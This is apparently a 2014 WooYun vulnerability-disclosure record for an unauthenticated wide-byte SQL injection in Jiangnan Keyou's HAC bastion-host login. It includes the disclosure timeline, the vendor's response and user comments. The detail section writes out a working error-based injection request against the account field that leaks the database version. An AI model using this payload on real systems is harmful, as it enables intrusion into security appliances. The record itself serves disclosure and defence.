{"id": 1981, "wybug_id": "wooyun-2014-061617", "wybug_title": "江南科友HAC运维审计系统（通杀）SQL注入漏洞（无需登录）", "wybug_corp": "江南科友科技股份有限公司", "wybug_author": "路人甲", "wybug_date": "2014-05-20 16:54", "wybug_open_date": "2014-08-18 16:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向公众公开  简要描述：  详细说明：  江南科友hac （堡垒机）无需登录，通杀0x01 介绍背景 运维安全审计系统（HAC）着眼于解决关键IT基础设施运维安全问题。它能够对Unix和Windows主机、服务器以及网络、安全设备上的数据访问进行安全、有效的操作审计,支持实时监控和事后回放。HAC补了传统审计系统的不足，将运维审计由事件审计提升为内容审计，集身份认证、授权、审计为一体，有效地实现了事前预防、事中控制和事后审计。0x02 漏洞原因 江南科友该堡垒机由于在登录过程当中，对字符过滤不当，默认是GBK编码，在写入mysql数据库过程当中，采用了该编码，导致产生一个针对中文编码的SQL注入漏洞，熟称“宽字节注入”本次属于黑盒测试，效果如下：\n\n其中登录过程当中用户名字段存在“宽字节注入”如下\npassword_check=1&account=%cf' and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a);&password=bbb&usb_code=&certcn=&randvalue=1205311366&notifypwd=&ac=&timeout=\n测试效果如下：\n\n\n\n\n\n数据库为：hacconf10x04 修复   更改数据库编码格式吧？ 或者采用其他修复方案吧 这种问题应该较多。。。   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-25 09:15 厂商回复： 对于内部网络系统，暂无实例进行验证，根据经验以及测试结果先行认定。已经由cnvd通过以往建立的处置渠道向广州江南科友科技股份有限公司    技术服务中心 任工转 报漏 洞情况。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-20 17:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  伪路人甲。我已经知道是谁提交的了哈哈    \n     2014-05-20 17:06 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @wefgod 不是你？    \n     2014-05-20 17:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xfkxfk 不是    \n     2014-05-20 17:44 |    \t\t黑云 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 米有)\t\t \n  之前提过一次吧。    \n     2014-05-21 08:40 |    \t\t洛丽潞丽 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 专注殴打GOV30年)\t\t \n  是电网那套?    \n     2014-05-21 10:32 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @洛丽潞丽 我去？    \n     2014-05-21 15:36 |    \t\tat0xm \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | I love Chao)\t\t \n  hac跟你有仇吧。哈哈    \n     2014-08-18 19:32 |    \t\tsutdy \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:33        | 0.0)\t\t \n  牛逼      \n     2014-08-20 11:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  看到IP更确定是谁了，打码不专业哦    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}